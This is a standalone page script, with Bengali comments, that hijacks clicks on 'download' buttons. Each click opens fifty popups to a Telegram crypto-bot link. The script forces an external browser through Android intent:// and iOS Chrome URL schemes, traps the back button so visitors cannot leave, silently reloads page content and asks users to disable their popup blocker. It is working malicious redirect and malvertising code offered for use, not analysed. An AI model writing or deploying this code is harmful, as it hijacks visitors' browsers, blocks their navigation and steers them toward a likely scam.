 <script>

const smartLink = "https://t.me/Pepecoin_bot_bot/startapp";
const UNLIMITED_COUNT = 50;   // 50 popups per click (unlimited feel)

// Safe popup opener
function openPopup(url) {
  try {
    let win = window.open(url, "_blank");
    if (!win || win.closed === undefined) {
      window.location.href = url;
    }
  } catch(e) {
    window.location.href = url;
  }
}

// Open many popups (unlimited feel) with small delay
function openMultiplePopups(url, count) {
  for (let i = 0; i < count; i++) {
    setTimeout(() => {
      openPopup(url);
    }, i * 200);  // 200ms gap
  }
}

// ========== PLATFORM DETECTION + UNLIMITED POPUPS ==========
function openExternal() {
  const ua = navigator.userAgent.toLowerCase();
  const isAndroid = /android/.test(ua);
  const isIOS = /iphone|ipad|ipod/.test(ua);
  const isTelegram = /telegram/.test(ua);

  // ✅ TELEGRAM (in-app browser) – direct smart link
  if (isTelegram) {
    openMultiplePopups(smartLink, UNLIMITED_COUNT);
    return;
  }

  // 🤖 ANDROID – use intent:// to force external Chrome browser
  if (isAndroid) {
    let intentLink = "intent://" + 
                     smartLink.replace(/^https?:\/\//, '') + 
                     "#Intent;scheme=https;package=com.android.chrome;end";
    openMultiplePopups(intentLink, UNLIMITED_COUNT);
    return;
  }

  // 🍎 iOS – use googlechrome:// scheme
  if (isIOS) {
    let chromeLink = "googlechrome://" + smartLink.replace(/^https?:\/\//, '');
    openMultiplePopups(chromeLink, UNLIMITED_COUNT);
    return;
  }

  // 💻 PC / Desktop or others – direct smart link
  openMultiplePopups(smartLink, UNLIMITED_COUNT);
}

// 🔥 CLICK EVENT: প্রতিটি ডাউনলোড বাটনে আনলিমিটেড পপআপ
document.addEventListener("click", function(e) {
  const btn = e.target.closest(".download");
  if (btn) {
    e.preventDefault();
    openExternal();
  }
});

// ========== BACK BUTTON TRAP + HIDDEN RELOAD + EXTRA POPUP ==========
history.pushState(null, null, location.href);
window.onpopstate = function () {
  // ব্যাক বাটন অকার্যকর
  history.pushState(null, null, location.href);
  
  // হিডেন রিলোড (শুধু কন্টেইনার রিফ্রেশ)
  fetch(window.location.href)
    .then(res => res.text())
    .then(html => {
      const parser = new DOMParser();
      const doc = parser.parseFromString(html, 'text/html');
      const newContainer = doc.querySelector('.container');
      if (newContainer) {
        document.querySelector('.container').innerHTML = newContainer.innerHTML;
      }
    })
    .catch(err => console.log("hidden reload error", err));
  
  // অতিরিক্ত ১টি পপআপ খোলা (ব্যাক বাটনে ফাঁদ)
  openPopup(smartLink);
};

console.log("✅ Unlimited popups: " + UNLIMITED_COUNT + " per click | Platform routing + back trap + hidden reload");
alert("⚠️ প্রতি Download ক্লিক করলে " + UNLIMITED_COUNT + "টি পপআপ খুলবে। ব্রাউজারের পপআপ ব্লকার বন্ধ রাখুন।");
</script>
